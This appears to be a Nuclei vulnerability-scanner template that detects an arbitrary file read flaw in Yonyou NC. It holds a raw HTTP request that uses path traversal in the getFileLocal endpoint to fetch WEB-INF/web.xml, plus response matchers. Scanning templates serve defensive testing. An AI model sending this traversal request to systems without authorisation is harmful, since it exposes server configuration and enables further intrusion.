id: yonyou-nc-getfilelocal-fileread

info:
  name: 用友NC getFileLocal 任意文件读取
  author: SleepingBag945
  severity: high

http:
  - raw:
      - |
        GET /portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains_all(body, '<?xml','nc.bs.framework')"
